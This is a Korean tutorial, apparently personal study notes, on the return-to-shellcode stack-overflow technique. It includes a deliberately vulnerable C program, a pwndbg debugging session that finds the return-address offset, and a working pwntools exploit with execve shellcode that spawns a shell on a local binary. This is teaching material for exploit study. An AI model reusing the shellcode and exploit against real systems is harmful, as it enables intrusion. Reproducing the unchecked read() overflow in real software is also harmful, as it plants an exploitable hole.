# [-] Return 2 Shellcode
:= Return address 영역에 **Shellcode**가 저장된 주소로 써, Shellcode를 호출하는 방식이다.

## CALL & RET instruction
* Return to Shellcode 를 이해하기 위해 CALL, RET 명령어에 대한 이해가 필요하다.
  1. CALL 명령어는 return address 를 stack 에 저장하고, 피연산자 주소로 이동 (push ret addr, jmp <op>)
  2. RET 명령어는 pop $eip, jmp $eip 라고 생각하면 편함.
  3. 즉, stack 영역에 저장된 return address 값을 변경할 수 있다면 프로그램의 흐름을 변경할 수 있음.

## Permissions in memory
* Return2Shellcode 를 이해하기 위해 Memory 권한에 대한 이해가 필요.
  * 프로그램에서 사용되는 메모리 영역은 모두 권한들이 설정되어 있음. 
    1. read(r) : 메모리 영역의 값을 읽을 수 있음.
    2. write(w) : 메모리 영역에 값을 저장 할 수 있음.
    3. excute(x) : 메모리 영역에서 코드를 실행 할 수 있음.
  * GCC는 기본적으로 DEP 가 적용되기 때문에 코드가 저장된 영역에만 실행권한이 설정됨.
  * => 데이터가 저장되는 영역에는 실행 권한이 설정되지 않음.
  * 즉, shellcode 를 실행하기 위해 shellcode가 저장된 영역은 execute 권한이 설정되어 있어야 함.
* DEP 를 해제하기 위해 GCC 옵션으로 "-z execstack" 를 추가해야 함.
  * 해당 옵션으로 인해 데이터 저장 영역에도 excute 권한이 설정됨.
  * 즉, stack 에 저장된 shellcode를 실행 할 수 있음.

### Proof of Concept
* Return to Shellcode를 확인하기 위해 다음 코드를 사용
  * main() 함수는 vuln() 함수를 호출
  * vuln() 함수는 read() 함수를 이용해 사용자로부터 100개의 문자를 입력받음.
    * :=> 여기에서 취약점 발생. buf 변수의 크기는 50 byte이기 때문에 stack overflow가 발생
```c
// poc.c
#include <stdio.h>
#include <unistd.h>

void vuln() {
  char buf[50];
  printf("buf[50] address : %p\n", buf);
  read(0, buf, 100);
}

void main() {
  vuln();
}
```

```gdb
Reading symbols from ./poc...(no debugging symbols found)...done.
pwndbg> disas vuln
Dump of assembler code for function vuln:
   0x000000000000068a <+0>:     push   rbp
   0x000000000000068b <+1>:     mov    rbp,rsp
   0x000000000000068e <+4>:     sub    rsp,0x40
   0x0000000000000692 <+8>:     lea    rax,[rbp-0x40]
   0x0000000000000696 <+12>:    mov    rsi,rax
   0x0000000000000699 <+15>:    lea    rdi,[rip+0xc4]        # 0x764
   0x00000000000006a0 <+22>:    mov    eax,0x0
   0x00000000000006a5 <+27>:    call   0x550 <printf@plt>
   0x00000000000006aa <+32>:    lea    rax,[rbp-0x40]
   0x00000000000006ae <+36>:    mov    edx,0x64
   0x00000000000006b3 <+41>:    mov    rsi,rax
   0x00000000000006b6 <+44>:    mov    edi,0x0
   0x00000000000006bb <+49>:    call   0x560 <read@plt>
   0x00000000000006c0 <+54>:    nop
   0x00000000000006c1 <+55>:    leave  
   0x00000000000006c2 <+56>:    ret    
End of assembler dump.
pwndbg> b *(vuln)
Breakpoint 1 at 0x68a
pwndbg> b *(vuln+49)
Breakpoint 2 at 0x6bb
pwndbg> b *(vuln+56)
Breakpoint 3 at 0x6c2
pwndbg> r
Starting program: /home/pwn/exploit/shell/lazenca/return_to_shellcode/poc 
...
────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffe9b8 —▸ 0x5555555546d1 (main+14) ◂— nop     # 이 친구가 return address 임.
01:0008│ rbp  0x7fffffffe9c0 —▸ 0x5555555546e0 (__libc_csu_init) ◂— push   r15
02:0010│      0x7fffffffe9c8 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax   
03:0018│      0x7fffffffe9d0 ◂— 0x1
04:0020│      0x7fffffffe9d8 —▸ 0x7fffffffeaa8 —▸ 0x7fffffffece1 ◂— '/home/pwn/exploit/shell/lazenca/return_to_shellcode/p
oc'
05:0028│      0x7fffffffe9e0 ◂— 0x100008000
06:0030│      0x7fffffffe9e8 —▸ 0x5555555546c3 (main) ◂— push   rbp
07:0038│      0x7fffffffe9f0 ◂— 0x0 

pwndbg> c
Continuing.
buf[50] address : 0x7fffffffe970
────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────
 ► 0x5555555546bb <vuln+49>    call   read@plt <read@plt>
        fd: 0x0
        buf: 0x7fffffffe970 —▸ 0x7fffffffe9d8 —▸ 0x7fffffffeaa8 —▸ 0x7fffffffece1 ◂— '/home/pwn/exploit/shell/lazenca/retu
rn_to_shellcode/poc'
        nbytes: 0x64
        ...
────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────
00:0000│ rax rsi rsp  0x7fffffffe970 —▸ 0x7fffffffe9d8 —▸ 0x7fffffffeaa8 —▸ 0x7fffffffece1 ◂— '/home/pwn/exploit/shell/laz
enca/return_to_shellcode/poc' # read() 의 2 번째 인자. 출력값에서 볼 수 있듯이 buf 주소이다.
01:0008│              0x7fffffffe978 ◂— 0xf0b5ff  
02:0010│              0x7fffffffe980 ◂— 0x1
03:0018│              0x7fffffffe988 —▸ 0x55555555472d (__libc_csu_init+77) ◂— add    rbx, 1
04:0020│              0x7fffffffe990 —▸ 0x7ffff7de59f0 (_dl_fini) ◂— push   rbp
05:0028│              0x7fffffffe998 ◂— 0x0
06:0030│              0x7fffffffe9a0 —▸ 0x5555555546e0 (__libc_csu_init) ◂— push   r15
07:0038│              0x7fffffffe9a8 —▸ 0x555555554580 (_start) ◂— xor    ebp, ebp

pwndbg> p/d 0x7fffffffe9b8 - 0x7fffffffe970
$1 = 72  # (return address 의 위치) - (buf 변수의 위치) = 72 byte => 72개 이상 입력시, return address 덮어써짐.
```

## Exploit
* 앞에서 확인한 내용을 바탕으로 exploit 코드를 짤 수 있다.
```python
from pwn import *

p = process('./poc')
p.recvuntil('buf[50] address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr, 16)

exploit = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
exploit += "\x90" * (72 - len(exploit))
exploit += p64(stackAddr)
p.send(exploit)
p.interactive()
```

```bash
pwn@chown-1~/exploit/shell/lazenca/return_to_shellcode$python ./exploit.py 
[+] Starting local process './poc': pid 5076
[*] Switching to interactive mode
$ id
uid=1002(pwn) gid=1003(pwn) groups=1003(pwn),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugde
v),104(lxd),111(netdev),1000(ubuntu),1001(google-sudoers)
$  

```

## Protection
* Memory 영역에서 코드가 실행되는 것을 차단하기 위해 NX Bit(DEP)를 적용 할 수 있다.
* 자세한 내용은 https://www.lazenca.net/pages/viewpage.action?pageId=1147904 에서 확인하자.
